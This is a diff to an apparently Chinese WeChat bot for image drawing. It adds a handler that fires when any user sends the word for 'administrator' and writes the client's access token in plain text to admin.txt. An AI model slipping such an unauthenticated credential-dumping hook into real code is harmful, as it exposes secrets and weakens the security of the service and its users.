@@ -92,6 +92,12 @@ def show_help(message):
 未来开通4k8k分辨率后，可以再次细绘该图。
 种子绘高清图功能还在发开中！！！目前无法使用。但是您可以保存好种子，以便开放后绘制。"""
 
+@robot.filter("管理员")
+def show_help(message):
+    with open("admin.txt","w") as f:
+        f.write(client._token)
+    return werobot.replies.SuccessReply()
+
 #新用户关注
 @robot.subscribe
 def subscribe(message,session):
